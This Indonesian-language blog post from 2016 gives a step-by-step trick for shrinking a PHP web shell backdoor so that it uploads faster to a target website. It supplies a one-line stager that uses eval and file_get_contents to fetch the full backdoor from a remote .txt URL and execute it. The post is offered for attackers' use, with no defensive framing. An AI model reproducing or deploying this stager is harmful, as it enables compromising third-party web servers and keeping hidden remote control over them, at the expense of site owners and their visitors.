---
title: 'Trik Memperkecil Size Shell Backdoor'
date: 2016-06-04T07:45:00.000-07:00
draft: false
aliases: [ "/2016/06/trik-memperkecil-size-shell-backdoor.html" ]
tags : [Knowledge]
---

[![](https://1.bp.blogspot.com/-8yayiUBJWYE/WFwD27Q4zEI/AAAAAAAABkM/RZk9pZkV4HAeIlN_79z6WKNE0n8xFM6KwCLcB/s320/size-logo.png)](https://1.bp.blogspot.com/-8yayiUBJWYE/WFwD27Q4zEI/AAAAAAAABkM/RZk9pZkV4HAeIlN_79z6WKNE0n8xFM6KwCLcB/s1600/size-logo.png)

  
Trik ini simple banget dan gw lihat belum banyak yang tau trik ini :)  
So apa salahnya kalau gw share triknya dimari..  
siapa sih yang kadang mau upload shell terus size kegedean ? pasti nunggunya agak lama kan, hehe  
Kali ini kita memanfaatkan function file\_get\_contents pada php  
  
Langkah Langkah :  
1\. Buat script seperti ini:  

> \[<?php eval("?>".file\_get\_contents("XXX"));?>\]

2\. Ganti XXX dengan backdoor (file.php) yang terupload di web dengan format (.txt). Lebih jelasnya lihat gambar dibawah :D  

[![](https://4.bp.blogspot.com/-BvOzN3mKejU/V1Locd2uTVI/AAAAAAAAAyc/LcI-gTEX90sxCIItfcLlKyKjHYThiuILQCLcB/s640/Screenshot_117.png)](https://4.bp.blogspot.com/-BvOzN3mKejU/V1Locd2uTVI/AAAAAAAAAyc/LcI-gTEX90sxCIItfcLlKyKjHYThiuILQCLcB/s1600/Screenshot_117.png)

3\. Jadi nanti seperti ini "...file\_get\_contents("sitemu.com/filemu.txt")..."  
4\. Dan lihat size backdoormu  sekarang, gak sampek 1kb :'v  

[![](https://4.bp.blogspot.com/-wO19YsCtQPI/V1L4vEZWQmI/AAAAAAAAAys/kqCKQ2BKrJwGzw_LpXUty5qqplBRB06PwCLcB/s640/Screenshot_118.png)](https://4.bp.blogspot.com/-wO19YsCtQPI/V1L4vEZWQmI/AAAAAAAAAys/kqCKQ2BKrJwGzw_LpXUty5qqplBRB06PwCLcB/s1600/Screenshot_118.png)

  
  
Semoga Bermanfaat :)